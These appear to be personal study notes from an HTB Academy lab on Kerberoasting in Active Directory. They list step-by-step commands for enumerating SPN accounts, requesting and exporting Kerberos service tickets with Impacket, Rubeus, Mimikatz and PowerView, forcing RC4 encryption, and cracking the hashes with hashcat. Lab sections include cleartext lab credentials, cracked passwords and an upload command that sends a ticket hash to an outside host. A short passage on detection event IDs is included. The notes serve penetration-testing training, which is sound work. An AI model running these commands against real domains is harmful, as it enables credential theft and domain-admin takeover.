# 10 kerberoasting

## Principle of Kerberoasting

This attack targets Service Principal Names (SPN) accounts

SPN = unique identifiers that Kerberos uses to map a service instance to a service account

\--> Kerberoasting often allows to become DOMAIN ADMIN For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp\_cmdshell extended procedure and gain code execution on the target SQL server.

This attack can be performed in multiple ways:

* From a non-domain joined Linux host using valid domain user credentials.
* From a domain-joined Linux host as root after retrieving the keytab file.
* From a domain-joined Windows host authenticated as a domain user.
* From a domain-joined Windows host with a shell in the context of a domain account.
* As SYSTEM on a domain-joined Windows host.
* From a non-domain joined Windows host using runas /netonly.

Tools to use :

* GetUserSPNs.py : from a non-domain joined Linux host
* Combination of setspn.exe Windows binary, PowerShell, and Mimikatz
* From Windows : tools such as PowerView, Rubeus, and other PowerShell scripts

\--> need to explain in the report if we were able to crack TGS or not and describe the recommandation

## Kerberoasting - from Linux

1. Prerequisites :

* account's cleartext password (or NTLM hash) AND
* shell in the context of a domain user account OR
* SYSTEM level access on a domain-joined host

1. Installing Impacket using Pip sudo python3 -m pip install .
2. Listing SPN Accounts with GetUserSPNs.py GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

3a) Requesting all TGS Tickets GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

$krb5tgs$23$\*BACKUPAGENT$... $krb5tgs$23$\*SOLARWINDSMONITOR$...

3b) Requesting a Single TGS ticket GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

4. Saving the TGS Ticket to an Output File GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev\_tgs
5. Cracking the Ticket Offline with Hashcat hashcat -m 13100 sqldev\_tgs /usr/share/wordlists/rockyou.txt

$krb5tgs$23$_sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev_$81...:database!

6. Testing Authentication against a Domain Controller sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

## Kerberoasting from Windows

Enumerating SPNs with setspn.exe : setspn.exe -Q _/_

\--> Focus on user accounts and ignore the computer accounts

Targeting a Single User : Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Retrieving All Tickets Using setspn.exe : PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q _/_ | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $\_.Context.PostContext\[0].Trim() }

Extracting Tickets from Memory with Mimikatz : mimikatz # base64 /out:true mimikatz # kerberos::list /export

Preparing the Base64 Blob for Cracking echo "" | tr -d&#x20;

Placing the Output into a File as .kirbi cat encoded\_file | base64 -d > sqldev.kirbi

Extracting the Kerberos Ticket using kirbi2john.py python2.7 kirbi2john.py sqldev.kirbi

Modifiying crack\_file for Hashcat sed 's/$krb5tgs$(._):(._)/$krb5tgs$23$\*\1\*$\2/' crack\_file > sqldev\_tgs\_hashcat

Viewing the Prepared Hash $krb5tgs$23$_sqldev.kirbi_$8131...

Cracking the Hash with Hashcat hashcat -m 13100 sqldev\_tgs\_hashcat /usr/share/wordlists/rockyou.txt $krb5tgs$23$_sqldev.kirbi_$81314...057feeab:database!

### Automated / Tool Based Route

1. Using PowerView to Extract TGS Tickets Import-Module .\PowerView.ps1 Get-DomainUser \* -spn | select samaccountname
2. Using PowerView to Target a Specific User Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
3. Exporting All Tickets to a CSV File Get-DomainUser \* -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight\_tgs.csv -NoTypeInformation
4. Viewing the Contents of the .CSV File cat .\ilfreight\_tgs.csv

### Rubeus

1. Using Rubeus .\Rubeus.exe .\Rubeus.exe kerberoast /stats

***

### | Supported Encryption Type | Count |

### | RC4\_HMAC\_DEFAULT | 7 | | AES128\_CTS\_HMAC\_SHA1\_96, AES256\_CTS\_HMAC\_SHA1\_96 | 2 |

-> users that support rubeus

RC4 encrypted tickets : Tickets that begin with $krb5tgs$23$\*

2. Select all admin accounts .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap /outfile:type.hash
3. Target a specific user \Rubeus.exe kerberoast /user:testspn /nowrap

\[\*] Hash : $krb5tgs$23$_testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL_$CEA71B221FC...

4. Checking encryption type with PowerView

Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname msds-supportedencryptiontypes samaccountname

***

testspn/kerberoast.inlanefreight.local 0 testspn

0 : not defined and set to the default of RC4\_HMAC\_MD5 24 : AES 128/256 encryption types are the only ones supported

5. Cracking the Ticket with Hashcat & rockyou.txt .\Rubeus.exe kerberoast /user:svc\_vmwaresso /nowrap /outfile:type.hash hashcat -m 13100 rc4\_to\_crack /usr/share/wordlists/rockyou.txt

If AES 128/256 is used everywhere :

1. Requesting a New Ticket

\[\*] Hash : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$\*testspn

2. Running Hashcat & Checking the Status of the Cracking Job

hashcat -m 19700 aes\_to\_crack /usr/share/wordlists/rockyou.txt

3. Viewing the Length of Time it Took to Crack

Force a ticket request in RC4 :

.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap /outfile:type.hash

### Edit Kerberos encryption type to reduce time of cracking

omputer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options, then double-clicking on Network security: Configure encryption types allowed for Kerberos and selecting the desired encryption type allowed for Kerberos.

\--> Removing all other encryption types except for RC4\_HMAC\_MD5

### Logs

4769 & 4770

0x17 : RC4 encryption type

user accounts with a SPN and with AdminCount=1

### LAB LINUX

ssh htb-student@$TARGET HTB\_@cademy\_stdnt!

ping 172.16.5.5 PING 172.16.5.5 (172.16.5.5) 56(84) bytes of data. 64 bytes from 172.16.5.5: icmp\_seq=1 ttl=128 time=0.583 ms

sudo python3 -m pip install .

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend Klmcargo2

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sqldev\_tgs Klmcargo2

ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation

***

SAPService/srv01.inlanefreight.local SAPService CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL 2022-04-18 14:40:02.959792

On Linux domain-joined host : md5sum sqldev\_tgs 91c2572d84354482374a575d83754c22 cat sqldev\_tgs |base64 -w 0;echo

On attack host : echo -n 'JGty' | base64 -d > sqldev\_tgs 91c2572d84354482374a575d83754c22

hashcat -m 13100 sqldev\_tgs /usr/share/wordlists/rockyou.txt

:!SapperFi2

GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService !SapperFi2

SAPService/srv01.inlanefreight.local SAPService CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL 2022-04-18 14:40:02.959792 2023-12-01 07:35:10.061941

-> Account Operators

### LAB Windows

xfreerdp /u:htb-student /p:"Academy\_student\_AD!" /v:$TARGET cd c:\tools

Import-Module .\PowerView.ps1 Get-DomainUser \* -spn

svc\_vmwaresso

### .\Rubeus.exe kerberoast /stats

### | Supported Encryption Type | Count |

\| RC4\_HMAC\_DEFAULT | 11 | | AES128\_CTS\_HMAC\_SHA1\_96, AES256\_CTS\_HMAC\_SHA1\_96 | 1 |

.\Rubeus.exe kerberoast /user:svc\_vmwaresso /nowrap /outfile:type.hash

\[Convert]::ToBase64String((Get-Content -path "C:\tools\type.hash" -Encoding byte))

Invoke-FileUpload -Uri http://10.10.14.114:8000/upload -File C:\tools\type.hash

echo JGtyYjV0Z3MkMjMkKnN2Y192bXdhcmVzc28kSU5MQU5FRlJFSUdIVC5MT0NBTCR2bXdhcmUvaW5sYW5lZnJlaWdodC5sb2NhbEBJTkxBTkVGUkVJR0hULkxPQ0FMKiQ2NzZENEM0ODNBRTZDQTc4RkJCNkM5OEYyMEUzQzQ3NiRCMUI4QUVFRTEzMkQzNUM4OUI3RDcxODBCRDE5MjU1NERBMENCNjM5NzY0RTlFODVGMThBNDgzRDJERDFFNkJCMkFCRTBEMzhFMDZDMUI3MUIzMDY1OEZGNThDQkI4NzFDOTFEOThCMTcwMUFGN0JDQjkzNTNBMjhCQ0ZGNTU2NjZDQUIwN0U5Qzc4NDZFMDY3MjY1NDY4REU5NDE3OTEyNUUzQjBEQkJBNEUzMzQ5NzdDM0IyMzNFNDcwOUJFNjgwRjI2MzNFQzNGQjdGODBCQzVFNUY5MzQyMzBBOTI5RTZEMURGMjM2M0IxREY4MkJEQ0UzQzE0NUI5RjgyQ0UxQkRBNDhDOEVBOUI5NDYzMzQwMUUzQjA5NjRDOThCNDkyMEZFQzY5OUMxNjc5MjYxMTk5OUVBMzUxQjU0NzkxRUJCQUZCMzc4RTkwMENGOUQ0N0RENDk0MTVEQUVFQzFGQ0FEMDk3OTY0QTE3ODQwMjA3RThGRTBDRjQ5NjRDQjZGNTJBMTY0MzkzNDEzNDZGMjVFRDM3QjIzMTFDRDk0QjhENUNBQTlGMkU0NjYxQkFFRENCRkIwQzY4NjM5RjEzRUNCRDBBQ0E2RkI2Q0M2QkM0RjYwMDRGMkQyQzdDRTMxNDU5NDA2MkQzMTRENEUyMkMxODY4RDFBM0U1MUU2MjlBMzhFNzU4NTc5RDkzQ0ZEQ0MyRjBGODA3MDVGODIyNTFBMUIzQzYwRTE4QkQ2REMyNjFEODlDMTYxMDlDRjM2RDJDOUM0MzE0QUU4QzZCRkY3MjI4NUExNzQ0ODE0NkE4Qjg3MUIwNjdBMkQwRjhGRDgzQjU5MzNBMUQ4MDhFRUIxQzYyMTU2MTMwRDdEMkY5NThFN0I4REIyMERDODgxQTI3MUJBQzVERDUyNjU1MDcxODREMkY2RUIyRjQxN0Q3QzlGNjUxMzQzRjE4RTlFQzVFREY0MUNCMjY3OTlEQ0QzNkIxRDZBRTlCMkU3NDMzMEMzNDcyOEEwMTk5NUMyOTM2MUEwOEQ5MjY4NUU5OThEREM0NzM5N0NGNUFDRjZERTI3RDZGN0Y5QjEzOEQ2MjBCRTg5NkVCRjAyMDdGRUEyODI0RTk0QThGMTI5MkMyOUQ5NkRDNDcwQkFEMjgwNEFBMTA3QkE2ODEzMjQ2OEFGMEI2NkEzQTVGQzc1ODVFNkRCNDhCMDgzMUZBMTExQ0I0MkVFMjIxQTkzRDdGRTExMDM2MkE2MTFCNURBRDY2NDhGNTk0RTMxNTAzRTUwNjc3NzEwOTM4NkNBQzQzNzU0NkQwQUY2M0M3QUZDMjg4RjhDOUE5OTFCQzA3N0U4QzQxNjdGN0E2MzcxQkE5MTE0MTNEQTY0QzBCREQ1NDFCQjQyMkUyMTg5Q0EwNjhBMTUzMzNGNzJDQjREODg3ODlDQzg1Q0Q0NjdGQjQ5OTJCREZEMkE5ODFENUMyNzQ2ODJEODY2NjM1MjcxN0NGNDY3QkFGMTc4MzY5QjQ3N0JERkE2QzgyOUVBMjEyM0E2QzVENzQzRDdDMThDMDE2NEY4NEE2MEIxNTNENTQwODg1QjEwREZEQUQ5NEExQjdCQzg1MkVFRTVDOUI3RTJFQzI2RjRDQzk0MDg0MUMwRjVCNDY0MUYwRDU0QTRFQ0FFRUY5QkY2MThCODRENzc1QjRERTBCQTYwQzA0QTU3MUQzNkFDRkFBNDE3M0I1MzY3MjBGQTFDRTNCMTM1MDM0QkUxRTJBRTMzN0RBRkUyN0EzQ0YwQjFENjMyMzZGMkJDNzE0NEE0RTY3REMwMDhGQUE2REY0QjQxRTBEQTYxMzM3MzEwQzcxRDU0NTc2QkNCRUMzNkVEMjI2OEE4ODk5Rjg5Rjg4QTA3ODVGNjdENzlCMzc0REVCNDQ1QzJBMjVENjcyNUFCQTg3MDk1QzA5MjhDNDM3N0E0RDRBQTNCNDIxMjE4OEVGOUYzRTBENjc1MDc5ODAwNTU4NDUyQkEyQzEyNjE4QjIzQTNDODE4MkRDNDNCREM0MEZDQ0UzODJEMDBDNDk5MzhGNDczM0IzMEYwMUM4MkY4NTg1NjlERDU2OEM1RTAyMDVBRTEzNEQzRDQ3MDc3RUJDQUQ5MjUzMUZFNjNDQzQzRjYxMkIxMDJEOTc1RDQyQjU2OUYxMjZCQkFEOTgxMzczQzM2RDMyNUY2QTc4QzBCNDI3RDNGRDlFMzcyQkRDMTMwQkYwNzc5MkYyOTAzNjU2OTExOUVDRTU5QkIzRDMzRTJBMjFEMDYzMTBFRDFDNjk0RTI0NzQ4RUQ0Nzg2NEVBQkJGNkU5MEI3RTJCMUMzODEwNjFFM0RDMEZDOEI5M0RENjc3MEE5NkMyRkZFNTEyMUYxNjE2MUE4QzMzNzg4MkQ0NTNGQTI3QjM1NDNEMkVCM0QwOTA4MDNGQzEyMzVCRUY3QzRBMzg4QzgyQjY3ODZCNzgyNjEzM0ZBMDk3MUNENUYyNTQ2OEVFNkJGNUY0NTE0QjM1OERBMTQ2NDcxRjBDOTNCRDFDRUFENkYyRDY5NDY2RkQ0MUU3QkQ1NkU2RDZCQzNDNEU5MEEyRjg5RkJERTc5MEYzMDAzRUU4NEU5MEVGM0I1RENDMzgwRTI3MjJCNzQ5MDQ1NkM0MjY1NkIzM0U3RUIyMzVDRkVBNkQ3QjVBRUZBODVBOUMwMDk4MkQ1QTJEOUUzNTk1MTg0MjVEOTBFMDUyODg2Q0I5NTk0ODlEMjY1RDZDNEUzRjY5MDVGQ0U4MDg2MDREQ0M0MTBENERFNjZBNDY4MDg3RkE4NUJGQUVGNTcwMkJFMUM4M0VCOUE4NTZEMUZEN0JDNEYxMDFCNTcxNEY2MDhGNTgwMUREMEIyMkUxNkNERkIyQ0I0Q0YxNjAzQ0Y1RkQ0QTJENTkxNzJEODA5QzYzNjk5QkVBNDlBNTQ4M0NDMUZBMkZEMDlEN0NBN0FDOEI5MTZBNDM3OTU5MTZEQTI1MTBCMTc2NzdGN0JBNjE1MDYyQkY1RTY0MTI4MjU3MzQyMzE1QTE0NTE4QzI4RDQxQTZGN0Q0MjlCMDc4NERGOUIwM0NGM0RFNDI2RDZGMkM5OEYyMDFFODUyQjUzRTk2RUJFNjRFNkY4MQ0K | base64 -d > type.hash

hashcat -m 13100 -a 0 type.hash /usr/share/wordlists/rockyou.txt

Virtual01
